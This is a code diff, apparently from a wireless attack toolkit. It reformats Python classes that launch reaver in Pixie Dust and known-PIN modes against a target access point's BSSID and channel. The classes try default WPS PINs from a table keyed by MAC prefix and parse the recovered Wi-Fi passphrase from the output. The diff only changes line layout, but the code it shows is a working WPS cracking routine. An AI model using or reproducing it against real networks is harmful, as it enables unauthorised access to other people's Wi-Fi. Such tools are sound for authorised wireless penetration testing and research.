@@ -28,14 +28,10 @@ class WPSPixieAttack(BaseAttack):
     Credits: Uses `reaver` and `pixiewps` for offline PIN recovery.
     """
 
-    def __init__(
-        self,
-        interface: str,
-        output_dir: str | None = None,
-        attack_timeout: int = 180,
-    ):
+    def __init__(self, interface: str, output_dir: str | None = None, attack_timeout: int = 180):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wps")
         super().__init__(interface, output_dir, attack_timeout)
 
@@ -68,22 +64,26 @@ class WPSPixieAttack(BaseAttack):
 
             cmd = [
                 "reaver",
-                "-i", self.interface,
-                "-b", target_bssid,
-                "-c", str(channel),
-                "-K", "1",
-                "-o", str(self.output_dir / f"{base_name}.log"),
+                "-i",
+                self.interface,
+                "-b",
+                target_bssid,
+                "-c",
+                str(channel),
+                "-K",
+                "1",
+                "-o",
+                str(self.output_dir / f"{base_name}.log"),
                 "-w",
-                "-d", "10",
+                "-d",
+                "10",
             ]
 
             if target_essid:
                 cmd.extend(["-e", target_essid])
 
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
 
             self._log("reaver process started", pid=proc.pid)
@@ -139,14 +139,10 @@ class WPSPinAttack(BaseAttack):
         "00:1b:2c": ["12345670", "00000000", "22222222"],
     }
 
-    def __init__(
-        self,
-        interface: str,
-        output_dir: str | None = None,
-        attack_timeout: int = 300,
-    ):
+    def __init__(self, interface: str, output_dir: str | None = None, attack_timeout: int = 300):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wps")
         super().__init__(interface, output_dir, attack_timeout)
 
@@ -184,20 +180,23 @@ class WPSPinAttack(BaseAttack):
 
                 cmd = [
                     "reaver",
-                    "-i", self.interface,
-                    "-b", target_bssid,
-                    "-c", str(channel),
-                    "-p", pin,
-                    "-o", str(self.output_dir / f"{base_name}_{pin}.log"),
+                    "-i",
+                    self.interface,
+                    "-b",
+                    target_bssid,
+                    "-c",
+                    str(channel),
+                    "-p",
+                    pin,
+                    "-o",
+                    str(self.output_dir / f"{base_name}_{pin}.log"),
                 ]
 
                 if target_essid:
                     cmd.extend(["-e", target_essid])
 
                 proc = await asyncio.create_subprocess_exec(
-                    *cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
+                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                 )
 
                 try:
@@ -211,7 +210,9 @@ class WPSPinAttack(BaseAttack):
                             result.wps_pin = pin
                             result.wps_psk = psk_match.group(1)
                             result.status = AttackStatus.SUCCESS
-                            self._notify_callback(callback, f"WPS PIN found: {pin}, PSK: {result.wps_psk}")
+                            self._notify_callback(
+                                callback, f"WPS PIN found: {pin}, PSK: {result.wps_psk}"
+                            )
                             break
 
                 except TimeoutError:
